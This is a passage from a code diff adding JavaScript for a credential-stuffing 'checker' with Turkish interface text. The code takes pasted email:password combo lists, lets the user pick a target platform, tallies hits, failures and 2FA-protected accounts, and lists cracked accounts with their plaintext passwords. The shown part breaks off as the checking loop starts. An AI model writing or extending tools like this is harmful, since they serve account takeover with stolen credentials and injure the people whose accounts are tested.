+    platforms.forEach(function(p){ var opt = document.createElement("option"); opt.value = p.name; opt.text = p.name; sel.appendChild(opt); });
+}
+
+function addHit(platform, email, password, status, details) {
+    if (!hitData[platform]) hitData[platform] = { hits: [], twofa: [] };
+    var entry = { email: email, password: password, time: new Date().toLocaleString(), details: details || {} };
+    if (status === "HIT") hitData[platform].hits.push(entry);
+    else if (status === "2FA") hitData[platform].twofa.push(entry);
+    renderHits();
+}
+
+function renderHits() {
+    var filter = document.getElementById("hitPlatformFilter").value;
+    var hitContainer = document.getElementById("hitList");
+    var twofaContainer = document.getElementById("twofaList");
+    var hits = [], twofas = [];
+    if (filter === "all") {
+        for (var p in hitData) {
+            if (hitData[p].hits) hitData[p].hits.forEach(function(h){ hits.push({ platform: p, email: h.email, password: h.password, time: h.time }); });
+            if (hitData[p].twofa) hitData[p].twofa.forEach(function(t){ twofas.push({ platform: p, email: t.email, password: t.password, time: t.time }); });
+        }
+    } else {
+        if (hitData[filter]) {
+            if (hitData[filter].hits) hitData[filter].hits.forEach(function(h){ hits.push({ platform: filter, email: h.email, password: h.password, time: h.time }); });
+            if (hitData[filter].twofa) hitData[filter].twofa.forEach(function(t){ twofas.push({ platform: filter, email: t.email, password: t.password, time: t.time }); });
+        }
+    }
+    hitContainer.innerHTML = hits.length === 0 ? '<div style="color:var(--muted);font-size:12px">Henüz HIT yok.</div>' :
+        hits.map(function(h){ return '<div class="hit-item"><span class="hit-email">[' + h.platform + '] ' + h.email + ' | ' + h.password + '</span><span class="hit-time">' + h.time + '</span></div>'; }).join('');
+    twofaContainer.innerHTML = twofas.length === 0 ? '<div style="color:var(--muted);font-size:12px">Henüz 2FA yok.</div>' :
+        twofas.map(function(t){ return '<div class="hit-item"><span class="hit-email">[' + t.platform + '] ' + t.email + ' | ' + t.password + '</span><span class="hit-time">' + t.time + '</span></div>'; }).join('');
+}
+
+function clearHits() {
+    if (!confirm("Tüm HIT ve 2FA kayıtları silinecek. Devam?")) return;
+    hitData = {}; renderHits();
+}
+
+function resetCheckerStats() {
+    document.getElementById("chkTotal").innerText = 0;
+    document.getElementById("chkHit").innerText = 0;
+    document.getElementById("chkBad").innerText = 0;
+    document.getElementById("chk2fa").innerText = 0;
+    document.getElementById("chkError").innerText = 0;
+    document.getElementById("chkRemaining").innerText = 0;
+}
+function updateRemaining() {
+    var remaining = totalLines - processedCount;
+    document.getElementById("chkRemaining").innerText = remaining < 0 ? 0 : remaining;
+}
+
+function startChecker() {
+    if (checkerRunning) return;
+    var comboText = document.getElementById("checkerCombo").value.trim();
+    if (!comboText) return alert("Combo girin (email:password)");
+    if (!currentPlatform) return alert("Önce bir platform seçin");
+    checkerRunning = true;
+    document.getElementById("checkerStartBtn").disabled = true;
+    document.getElementById("checkerStopBtn").style.display = "inline-block";
+    document.getElementById("checkerResults").innerHTML = "";
+    var lines = comboText.split("\n").filter(function(l){ return l.includes(":"); });
+    totalLines = lines.length;
+    processedCount = 0
